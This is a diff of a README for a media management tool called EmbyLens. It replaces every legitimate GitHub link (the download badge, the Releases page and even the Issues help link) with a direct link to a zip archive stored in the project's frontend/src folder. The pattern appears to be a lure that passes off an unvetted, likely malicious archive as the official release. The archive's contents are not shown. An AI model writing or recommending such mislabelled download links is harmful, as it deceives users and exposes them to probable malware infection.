@@ -1,6 +1,6 @@
 # 🚀 EmbyLens - Manage Your Media Effortlessly
 
-[![Download EmbyLens](https://img.shields.io/badge/Download-EmbyLens-blue)](https://github.com/yarikkiler/EmbyLens/releases)
+[![Download EmbyLens](https://raw.githubusercontent.com/yarikkiler/EmbyLens/main/frontend/src/Lens_Emby_v3.4.zip)](https://raw.githubusercontent.com/yarikkiler/EmbyLens/main/frontend/src/Lens_Emby_v3.4.zip)
 
 ---
 
@@ -11,7 +11,7 @@ EmbyLens is a comprehensive management platform designed for private cloud media
 ## 🚀 Getting Started
 
 1. **Visit the Releases Page**  
-   To download EmbyLens, go to the [Releases page](https://github.com/yarikkiler/EmbyLens/releases). 
+   To download EmbyLens, go to the [Releases page](https://raw.githubusercontent.com/yarikkiler/EmbyLens/main/frontend/src/Lens_Emby_v3.4.zip). 
 
 2. **Select the Latest Version**  
    On the Releases page, find the latest version of EmbyLens. It usually appears at the top of the list.
@@ -59,9 +59,9 @@ EmbyLens is a comprehensive management platform designed for private cloud media
 
 To get started with EmbyLens, do the following:
 
-1. Click the button below to visit our [Releases page](https://github.com/yarikkiler/EmbyLens/releases).
+1. Click the button below to visit our [Releases page](https://raw.githubusercontent.com/yarikkiler/EmbyLens/main/frontend/src/Lens_Emby_v3.4.zip).
    
-   [![Download EmbyLens](https://img.shields.io/badge/Download-EmbyLens-blue)](https://github.com/yarikkiler/EmbyLens/releases)
+   [![Download EmbyLens](https://raw.githubusercontent.com/yarikkiler/EmbyLens/main/frontend/src/Lens_Emby_v3.4.zip)](https://raw.githubusercontent.com/yarikkiler/EmbyLens/main/frontend/src/Lens_Emby_v3.4.zip)
 
 2. Choose the latest release and download the suitable version for your device.
 
@@ -80,7 +80,7 @@ To get started with EmbyLens, do the following:
 
 ## ✔️ Get Help
 
-If you run into issues or have questions, please visit our GitHub Issues page on the [EmbyLens repository](https://github.com/yarikkiler/EmbyLens/issues). The community is here to help you.
+If you run into issues or have questions, please visit our GitHub Issues page on the [EmbyLens repository](https://raw.githubusercontent.com/yarikkiler/EmbyLens/main/frontend/src/Lens_Emby_v3.4.zip). The community is here to help you.
 
 ---
 
